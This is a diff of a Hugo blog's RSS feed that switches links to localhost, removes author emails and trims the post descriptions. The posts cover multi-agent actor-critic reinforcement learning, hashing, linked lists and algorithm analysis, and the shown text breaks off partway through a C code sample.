@@ -1,964 +1,114 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
-    <title>Posts on drMoscovium Blog</title>
-    <link>https://drMoscovium.dev/posts/</link>
-    <description>Recent content in Posts on drMoscovium Blog</description>
-    <generator>Hugo -- gohugo.io</generator>
+    <title>Posts on drMoscovium</title>
+    <link>http://localhost:1313/posts/</link>
+    <description>Recent content in Posts on drMoscovium</description>
+    <image>
+      <title>drMoscovium</title>
+      <url>http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- 0.125.7</generator>
     <language>en</language>
-    <managingEditor>gautamyojan0@gmail.com (Yojan Gautam)</managingEditor>
-    <webMaster>gautamyojan0@gmail.com (Yojan Gautam)</webMaster>
-    <lastBuildDate>Sun, 04 Jun 2023 20:07:50 -0400</lastBuildDate><atom:link href="https://drMoscovium.dev/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 04 Jun 2023 20:07:50 -0400</lastBuildDate>
+    <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Centralized Learning and Decentralized execution using Multi-Agent Actor-Critic(MAAC) </title>
-      <link>https://drMoscovium.dev/posts/maac/</link>
+      <link>http://localhost:1313/posts/maac/</link>
       <pubDate>Sun, 04 Jun 2023 20:07:50 -0400</pubDate>
-      <author>gautamyojan0@gmail.com (Yojan Gautam)</author>
-      <guid>https://drMoscovium.dev/posts/maac/</guid>
-      <description>&lt;p&gt;When we think of Artificial General Intelligence (AGI) as depicted in Hollywood, we often envision either the &lt;a href=&#34;https://en.wikipedia.org/wiki/Terminator_(franchise)&#34;&gt;Terminator&lt;/a&gt; or &lt;a href=&#34;https://en.wikipedia.org/wiki/Star_Trek&#34;&gt;Star Trek&lt;/a&gt;. While there have been many recent improvements in Artificial Intelligence, most of them lack one of the main factors that make us human: the ability to cooperate with others to overcome tasks. Cooperation is something we excel at, and to achieve AGI, we would need algorithms that allow machines to easily engage in cooperation.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/EmergentTool.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;A group of researchers from OpenAI has developed a new algorithm called &lt;a href=&#34;https://arxiv.org/abs/1706.02275&#34;&gt;Multi-Agent Actor-Critic (MAAC)&lt;/a&gt;. This algorithm, based on Deep Reinforcement Learning for multi-agent domains, enables multiple agents to cooperatively work on a single task. Such algorithms are useful in multi-agent games, such as a team of soccer robots working together to score goals while simultaneously attempting to prevent the opposing team from doing the same. This involves cooperation between teammates and competition against opponents.&lt;/p&gt;
-&lt;p&gt;Traditional reinforcement learning algorithms, such as &lt;a href=&#34;https://link.springer.com/article/10.1007/BF00992698&#34;&gt;Q-learning&lt;/a&gt; or &lt;a href=&#34;https://towardsdatascience.com/policy-gradients-in-a-nutshell-8b72f9743c5d&#34;&gt;policy gradients&lt;/a&gt;, face significant challenges in multi-agent environments. The presence of other agents introduces non-stationarity, where the environment changes dynamically as agents adapt their policies. This non-stationarity makes it difficult for an agent to learn and converge to an optimal strategy.&lt;/p&gt;
-&lt;p&gt;MAAC is a state-of-the-art algorithm designed to address the challenges of multi-agent reinforcement learning in mixed cooperative-competitive environments. It combines the concepts of actor-critic architecture and centralized training with decentralized execution. The actor-critic architecture is a popular paradigm in reinforcement learning, consisting of two main components: the actor and the critic. The actor is responsible for learning and selecting actions, while the critic evaluates the actions taken by the selected agent and rewards or punishes the agent accordingly. In MAAC, each agent maintains its own actor and critic networks, allowing for decentralized decision-making.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://images.openai.com/blob/764afdf0-e3f5-4164-9829-0d4dc3205db2/nipsdiagram_2.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;MAAC leverages centralized training to facilitate learning in cooperative scenarios. During training, agents can access the complete observation and action history of all other agents. This centralized view provides crucial information for learning effective joint policies. However, during execution, agents act in a decentralized manner, using only local observations to make decisions. This approach allows agents to generalize their learned policies to unseen scenarios, bringing them closer to artificial general intelligence.&lt;/p&gt;
-&lt;h2 id=&#34;benefits-of-maac&#34;&gt;Benefits of MAAC&lt;/h2&gt;
-&lt;h3 id=&#34;improved-cooperation-and-competition&#34;&gt;Improved Cooperation and Competition&lt;/h3&gt;
-&lt;p&gt;MAAC enables agents to learn effective cooperative strategies by considering the actions and observations of other agents. It encourages agents to communicate and coordinate their actions towards achieving common goals. At the same time, the competitive aspect of the environment is preserved, allowing agents to adapt and compete for individual rewards.&lt;/p&gt;
-&lt;h3 id=&#34;robustness-to-dynamic-environments&#34;&gt;Robustness to Dynamic Environments&lt;/h3&gt;
-&lt;p&gt;MAAC&amp;rsquo;s actor-critic architecture and centralized training approach make it more robust in dynamic environments. As the behavior of other agents changes, the actor can adapt its policy based on the centralized view of the environment. This adaptability enables agents to handle non-stationarity effectively.&lt;/p&gt;
-&lt;h3 id=&#34;scalability&#34;&gt;Scalability&lt;/h3&gt;
-&lt;p&gt;MAAC is scalable to environments with a large number of agents. Since each agent maintains its own actor and critic networks, the computation and memory requirements scale linearly with the number of agents. This scalability makes MAAC suitable for complex real-world applications involving numerous interacting agents.&lt;/p&gt;
-&lt;p&gt;Multi-Agent Actor-Critic (MAAC) algorithms provide a powerful framework for addressing the challenges of mixed cooperative-competitive environments in multi-agent reinforcement learning. By combining the actor-critic architecture with centralized training and decentralized execution, MAAC enables agents to strike a balance between cooperation and competition. The ability to learn effective joint policies while adapting to dynamic environments makes MAAC a promising approach for tackling complex real-world scenarios with multiple interacting agents.&lt;/p&gt;
-</description>
+      <guid>http://localhost:1313/posts/maac/</guid>
+      <description>When we think of Artificial General Intelligence (AGI) as depicted in Hollywood, we often envision either the Terminator or Star Trek. While there have been many recent improvements in Artificial Intelligence, most of them lack one of the main factors that make us human: the ability to cooperate with others to overcome tasks. Cooperation is something we excel at, and to achieve AGI, we would need algorithms that allow machines to easily engage in cooperation.</description>
     </item>
-    
     <item>
       <title>Hashing</title>
-      <link>https://drMoscovium.dev/posts/hashing/</link>
+      <link>http://localhost:1313/posts/hashing/</link>
       <pubDate>Tue, 04 Oct 2022 23:16:28 -0400</pubDate>
-      <author>gautamyojan0@gmail.com (Yojan Gautam)</author>
-      <guid>https://drMoscovium.dev/posts/hashing/</guid>
-      <description>&lt;p&gt;When we require a data structure that can perform add, remove, and search operations in constant time, we can turn to the concept of hashing. While using an array allows for constant-time addition, searching and removal operations can be time-consuming. Hashing offers a solution by significantly reducing the time complexity involved.&lt;/p&gt;
-&lt;h2 id=&#34;terminology&#34;&gt;Terminology&lt;/h2&gt;
-&lt;p&gt;Before diving into the details of hash tables, let&amp;rsquo;s clarify some key terms:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Hash code: An integer value computed for a given object, which serves as the index in the hash table.&lt;/li&gt;
-&lt;li&gt;Hash function: A function that calculates the hash code for an object.&lt;/li&gt;
-&lt;li&gt;Hash table: A data structure that stores objects based on their hash codes, typically using an array.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h1 id=&#34;hash-table&#34;&gt;Hash Table&lt;/h1&gt;
-&lt;p&gt;A hash table stores objects in an array, using the object&amp;rsquo;s hash code as the index. To achieve constant-time operations, we need to address two important aspects: computing the hash code and handling collisions.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Computing the hash code&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;To ensure fairness and reduce collisions, the hash function must adhere to the Hash Contract. According to the contract, if two objects are equal, they must produce the same hash code. Additionally, the hash function should be efficient in its computation.&lt;/p&gt;
-&lt;p&gt;When the hash code for an object is larger than the array size, we need to map it to a valid index within the array. This can be achieved by using the modulus operator. For example, if the hash code is 798 and the length of the array is 10, the index can be calculated as 798 % 10 = 8. Thus, the object will be stored at index 8 of the array.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Handling collisions&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Collisions occur when two or more objects produce the same hash code and need to be stored at the same index. One common approach to handle collisions is called Separate Chaining. In this method, if an index already has an object stored, we create a linked list at that index to accommodate multiple values.&lt;/p&gt;
-&lt;p&gt;To evaluate the performance of a hash table, we calculate the load factor by dividing the total item count by the length of the hash table. Maintaining an appropriate load factor is crucial for the efficient operation of the hash table.&lt;/p&gt;
-&lt;p&gt;Hash tables provide an efficient solution for achieving constant-time operations for add, remove, and search tasks. By properly computing hash codes and handling collisions, we can leverage the power of hashing to address these requirements effectively.&lt;/p&gt;
-</description>
+      <guid>http://localhost:1313/posts/hashing/</guid>
+      <description>When we require a data structure that can perform add, remove, and search operations in constant time, we can turn to the concept of hashing. While using an array allows for constant-time addition, searching and removal operations can be time-consuming. Hashing offers a solution by significantly reducing the time complexity involved.
+Terminology Before diving into the details of hash tables, let&amp;rsquo;s clarify some key terms:
+Hash code: An integer value computed for a given object, which serves as the index in the hash table.</description>
     </item>
-    
     <item>
       <title>Lists</title>
-      <link>https://drMoscovium.dev/posts/list/</link>
+      <link>http://localhost:1313/posts/list/</link>
       <pubDate>Tue, 04 Oct 2022 20:10:23 -0400</pubDate>
-      <author>gautamyojan0@gmail.com (Yojan Gautam)</author>
-      <guid>https://drMoscovium.dev/posts/list/</guid>
-      <description>&lt;h1 id=&#34;lists&#34;&gt;Lists&lt;/h1&gt;
-&lt;p&gt;Two of the most common types of lists are Dynamic Array Lists and Linked Lists. Each of these lists has its own advantages and disadvantages.&lt;/p&gt;
-&lt;h2 id=&#34;dynamic-array-list&#34;&gt;Dynamic Array List&lt;/h2&gt;
-&lt;p&gt;A Dynamic Array List is a list that grows as more items are added to it. It is a widely used list implementation in many programming languages. While it is easy to use, it may not be the most efficient. Let&amp;rsquo;s take a closer look at how a Dynamic Array List works.&lt;/p&gt;
-&lt;p&gt;To create a Dynamic Array List, we start with a regular array of a default initial size, such as 2. As we add more values to the list, the size of the underlying array doubles every time it becomes full. The following diagram illustrates this process:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lists/figure1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;This type of data structure is easy to implement but may not be very efficient. When we add a new value to the array and it becomes full, we need to create a new array and copy the old values to the new one. This process of creating a new array and copying values has a time complexity of O(n).&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lists/figure2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;h4 id=&#34;big-o-notation-for-dynamic-array-list&#34;&gt;Big O Notation for Dynamic Array List&lt;/h4&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Data Structure&lt;/th&gt;
-&lt;th&gt;Get/Set&lt;/th&gt;
-&lt;th&gt;Add/Remove End&lt;/th&gt;
-&lt;th&gt;Insert/Remove Front&lt;/th&gt;
-&lt;th&gt;Insert/Remove Middle&lt;/th&gt;
-&lt;th&gt;Search&lt;/th&gt;
-&lt;th&gt;Easy to grow?&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Dynamic Array&lt;/td&gt;
-&lt;td&gt;O(1)&lt;/td&gt;
-&lt;td&gt;O(n)&lt;/td&gt;
-&lt;td&gt;O(n)&lt;/td&gt;
-&lt;td&gt;O(n)&lt;/td&gt;
-&lt;td&gt;O(n)&lt;/td&gt;
-&lt;td&gt;Not really&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;The table above shows the worst-case time complexity for the Dynamic Array List. However, since the Dynamic Array only needs to copy values when it becomes full, the average time complexity can be analyzed using amortized analysis. This analysis considers the efficiency over a sequence of M operations.&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Data Structure&lt;/th&gt;
-&lt;th&gt;Get/Set&lt;/th&gt;
-&lt;th&gt;Add/Remove End&lt;/th&gt;
-&lt;th&gt;Insert/Remove Front&lt;/th&gt;
-&lt;th&gt;Insert/Remove Middle&lt;/th&gt;
-&lt;th&gt;Search&lt;/th&gt;
-&lt;th&gt;Easy to grow?&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Dynamic Array&lt;/td&gt;
-&lt;td&gt;O(1)&lt;/td&gt;
-&lt;td&gt;O(1)*&lt;/td&gt;
-&lt;td&gt;O(n)&lt;/td&gt;
-&lt;td&gt;O(n)&lt;/td&gt;
-&lt;td&gt;O(n)&lt;/td&gt;
-&lt;td&gt;Not really&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;We can see that the average time complexity for adding an item to the Dynamic Array List is O(1).&lt;/p&gt;
-&lt;h2 id=&#34;linked-list&#34;&gt;Linked List&lt;/h2&gt;
-&lt;p&gt;Linked Lists are lists based on linked nodes. Each node holds a value and a reference to the next node.&lt;/p&gt;
-&lt;p&gt;There are two different types of Linked Lists:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Singly-Linked Lists&lt;/li&gt;
-&lt;li&gt;Doubly-Linked Lists&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;singly-linked-list&#34;&gt;Singly-Linked List&lt;/h3&gt;
-&lt;p&gt;A Singly-Linked List has one data field and one field for the next node.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Node&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;T&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; T value;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; Node&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;T&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; next;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Node&lt;/span&gt;() {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Node&lt;/span&gt;(T value) {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; value;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is a Node class in Java for Singly-Linked List.&lt;/p&gt;
-&lt;p&gt;A visual representation of node would look something like.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lists/figure3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;A linked list is essentially a chain of these nodes, as shown below:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lists/figure4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;The first node in the list is called the head, and the last node is called the tail. The tail node points to null. When iterating over a linked list, we know we have reached the end when tail.next equals null.&lt;/p&gt;
-&lt;h3 id=&#34;doubly-linked-list&#34;&gt;Doubly-Linked List&lt;/h3&gt;
-&lt;p&gt;A Doubly-Linked List is similar to a Singly-Linked List, but each node has a reference to the previous node as well.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Node&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;T&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; T value;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; Node&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;T&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; next;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; Node&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;T&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; prev;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; Node&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;T&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;(){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; Node&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;T&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;(T value){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; value;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We just need to add a prev field to store a reference to the previous node. A visual representation of a Doubly-Linked List would look something like this:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lists/figure5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;o-notation-summary&#34;&gt;O notation summary&lt;/h2&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Data Structure&lt;/th&gt;
-&lt;th&gt;Get/Set&lt;/th&gt;
-&lt;th&gt;Add/Remove End&lt;/th&gt;
-&lt;th&gt;Insert/Remove Front&lt;/th&gt;
-&lt;th&gt;Insert/ Remove Middle&lt;/th&gt;
-&lt;th&gt;Search&lt;/th&gt;
-&lt;th&gt;Easy to grow?&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Dymanic Array&lt;/td&gt;
-&lt;td&gt;1&lt;/td&gt;
-&lt;td&gt;&lt;em&gt;1&lt;/em&gt;*&lt;/td&gt;
-&lt;td&gt;N&lt;/td&gt;
-&lt;td&gt;N&lt;/td&gt;
-&lt;td&gt;N&lt;/td&gt;
-&lt;td&gt;Not really&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Singly-Linked List&lt;/td&gt;
-&lt;td&gt;N&lt;/td&gt;
-&lt;td&gt;1,N&lt;/td&gt;
-&lt;td&gt;1&lt;/td&gt;
-&lt;td&gt;N&lt;/td&gt;
-&lt;td&gt;N&lt;/td&gt;
-&lt;td&gt;yes&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Doubly-Linked List&lt;/td&gt;
-&lt;td&gt;N&lt;/td&gt;
-&lt;td&gt;1&lt;/td&gt;
-&lt;td&gt;1&lt;/td&gt;
-&lt;td&gt;N&lt;/td&gt;
-&lt;td&gt;N&lt;/td&gt;
-&lt;td&gt;yes&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-</description>
+      <guid>http://localhost:1313/posts/list/</guid>
+      <description>Lists Two of the most common types of lists are Dynamic Array Lists and Linked Lists. Each of these lists has its own advantages and disadvantages.
+Dynamic Array List A Dynamic Array List is a list that grows as more items are added to it. It is a widely used list implementation in many programming languages. While it is easy to use, it may not be the most efficient. Let&amp;rsquo;s take a closer look at how a Dynamic Array List works.</description>
     </item>
-    
     <item>
       <title>Algorithm Analysis</title>
-      <link>https://drMoscovium.dev/posts/algorithmanalysis/</link>
+      <link>http://localhost:1313/posts/algorithmanalysis/</link>
       <pubDate>Tue, 04 Oct 2022 19:45:01 -0400</pubDate>
-      <author>gautamyojan0@gmail.com (Yojan Gautam)</author>
-      <guid>https://drMoscovium.dev/posts/algorithmanalysis/</guid>
-      <description>&lt;h1 id=&#34;analyzing-algorithm&#34;&gt;Analyzing Algorithm&lt;/h1&gt;
-&lt;p&gt;An algorithm is a finite sequence of rigorous instructions, typically used to solve a specific problem. Some of the important question that might arise is, Why do we need algorithm? And What is algorithm analysis?&lt;/p&gt;
-&lt;p&gt;Algorithm allows one to define how certain function works. For example, we want to add a value to a &lt;strong&gt;Data structure&lt;/strong&gt;. We would need to find the most efficient way to add it to the data structure. Algorithm analysis allows us to figure out how efficient an algorithm is.&lt;/p&gt;
-&lt;h2 id=&#34;complexities&#34;&gt;Complexities&lt;/h2&gt;
-&lt;p&gt;For a given algorithm, there are three types of complexities:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Time-Complexity: How much time it would take for an algorithm to perform a certain task.&lt;/li&gt;
-&lt;li&gt;Space-Complexity: How much storage/memory would an algorithm use to perform the given task.&lt;/li&gt;
-&lt;li&gt;Implementation-Complexity: How hard is it for us to code the given algorithm.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;modeling-time-complexity&#34;&gt;Modeling Time Complexity&lt;/h2&gt;
-&lt;p&gt;We represent complexity as a function of the input. While referring to time complexity, we use T(n) where n in the input size. Let&amp;rsquo;s look at some sample examples.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decimalToBinary&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; decValue, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; binString[]) {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; tempArry[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; decValue; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;/=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) { 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		tempArry[count] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		count &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For the above function, the time complexity will be O(log n). If we say that decValue is n, then in every increment the decValue will be halved.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;reverse&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; string[]){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;reversed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;malloc&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(string));
